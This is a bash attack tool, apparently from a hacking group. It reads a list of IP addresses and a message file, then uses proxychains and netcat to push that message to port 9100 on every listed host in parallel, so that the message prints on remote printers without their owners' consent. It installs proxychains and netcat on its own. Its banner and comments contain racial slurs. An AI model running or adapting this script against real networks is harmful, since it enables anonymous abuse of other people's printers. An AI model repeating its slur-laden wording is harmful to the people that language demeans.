
# color
PP='\033[95m' # purple
CY='\033[96m' # cyan
BL='\033[94m' # blue
GR='\033[92m' # green
YW='\033[93m' # yellow
RD='\033[91m' # red
NT='\033[97m'  # netral
function header()
{
	printf "

${YW}\e[1;100m~ We are INNWA Family ~\e[0m${RD} 
 ${CY}By Pyae Sone Hmoo{RD}
 ${CY}We are Myanmar We are Power ${RD}

"
}


function chk_depen(){
	clear
	if [[ -f "dependencies.conf" ]]; then
		sleep 1
	else
		printf "\t ${BL}[!] ${NT}Checking Guns ..........\n"
		echo ""
		touch dependencies.conf
		echo "# 4WSec And They Niggas Just Dropped Yo Printer" >> dependencies.conf
		sleep 1
		proxychains > /dev/null 2>&1
		if [[ $? -eq 0 ]]; then
			printf "\t ${YW}Proxychains ${NT}.......... ${GR}[✔]\n"
			echo "proxychains = yes" >> dependencies.conf
		else
			printf "\t ${YW}Proxychains ${NT}.......... ${RD}[✘]\n"
			sleep 1
			apt-get install proxychains -y
		fi
		nc -h > /dev/null 2>&1
		if [[ $? -eq 0 ]]; then
			printf "\t ${YW}Netcat ${NT}.......... ${GR}[✔]\n"
			echo "netcat = yes" >> dependencies.conf
		else
			printf "\t ${YW}Netcat ${NT}.......... ${RD}[✘]\n"
			sleep 1
			apt-get install nc
		fi
		sleep 5
		clear
	fi
}


function 4tt4ck(){
	printf "${RD}HTP ${CY}Attacking The Nigga ${NT}~> ${YW}%s:%s \n" $wha $p0rt
	echo "$(cat $msg_file)" | proxychains nc $wha $p0rt > /dev/null 2>&1;
}


function go_print(){
	con=1
	clear
	chk_depen
	header
	printf "${GR}"
	read -p "        Enter IP List: " ip_list;
	if [[ ! -e $ip_list ]]; then
		printf "\t${RD}[!] ${YW}File Not Found\n"
		exit
	fi
	read -p "        Enter Message File: " msg_file;
	if [[ ! -e $msg_file ]]; then
		printf "\t${RD}[!] ${YW}File Not Found\n"
		exit
	fi
	read -p "        Enter Port (Default 9100): " p0rt;
	if [[ $p0rt="" ]]; then
		p0rt=9100
	fi
	read -p "        Enter Threads: " threads;
	echo ""
	for wha in $(cat $ip_list);
	do
		fast=$(expr $con % $threads)
		if [[ $fast == 0 && $con > 0 ]]; then
			sleep 3
		fi
		4tt4ck &
		con=$[$con+1]
	done
	wait
}
go_print
